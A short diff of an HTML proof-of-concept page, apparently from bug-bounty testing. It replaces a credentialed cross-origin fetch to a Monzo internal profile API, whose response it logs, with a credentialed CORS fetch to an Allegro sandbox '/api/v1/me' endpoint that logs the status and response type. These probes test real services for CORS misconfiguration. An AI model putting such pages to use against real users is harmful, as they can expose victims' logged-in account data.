@@ -1,25 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Monzo CORS Demonstration (Safe PoC)</h1>
-<p>Open your browser console to see the response.</p>
-
 <script>
-/*
-  SAFE PoC — Only works on your own account.
-  No data is sent anywhere.
-*/
-fetch("https://internal-api.monzo.com/signup/profile", {
-    method: "GET",
-    credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-    console.log("Cross-origin readable response:", data);
-})
-.catch(e => console.error("Error:", e));
+fetch("https://edge.allegro.pl.allegrosandbox.pl/api/v1/me", {
+  credentials: "include",
+  mode: "cors"
+}).then(r => {
+  console.log("status:", r.status, "type:", r.type);
+}).catch(e => console.log("error", e));
 </script>
-
 </body>
 </html>
-
